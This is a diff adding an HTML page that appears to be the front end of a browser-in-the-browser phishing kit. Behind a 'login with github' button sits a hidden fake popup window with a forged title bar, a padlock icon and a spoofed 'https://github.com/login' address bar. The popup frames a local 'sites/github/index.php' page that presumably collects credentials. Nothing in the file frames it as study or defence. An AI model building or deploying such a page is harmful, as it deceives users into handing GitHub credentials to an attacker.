@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="style.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<style>
+/* Light mode */
+@media (prefers-color-scheme: light) {
+    body {
+        background-color: #FAFAFA;
+        color: black;
+    }
+}
+/* Dark mode */
+@media (prefers-color-scheme: dark) {
+    body {
+        background-color: #ECEFF1;
+        color: white;
+    }
+}
+
+</style>
+<body>
+<button 
+	id="clickme" 
+	style="
+		margin-left:auto; 
+		margin-right: auto;
+		width:180px;
+		height:50px; 
+		margin-top: 2.5%; 
+		text-align: center; 
+		display: block;"><img src=https://www.google.com/s2/favicons?domain=https://github.com style='position:relative;top:2px'></img>&nbsp;&nbsp;<b style='position:relative;bottom:2px'>login with github</b>
+	</button>
+<div id="window" style="margin:auto; position: relative; bottom: 2.5%; display: none;">
+<!-- Title bar start -->
+<div id="title-bar-width">
+	<div id="title-bar">
+		<div style="margin-top:5px;">
+			<img src="https://www.google.com/s2/favicons?domain=https://github.com" width="20px" height="20px" id="logo">
+			<span id="logo-description">Github</span>
+		</div>
+
+		<div>
+			<span id="minimize">&#8212;</span>
+			<span id="square">□</span>
+			<span id="exit">✕</span>
+		</div>
+	</div>
+	<div id="url-bar">
+		<img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
+		<span id="domain-name">https://github.com/login</span>
+	</div>
+</div>
+<!-- Content start -->
+<iframe id="content" src="sites/github/index.php" frameBorder="0"></iframe>
+</div>
+</body>
+<script src="script.js"></script>
+</html>
+
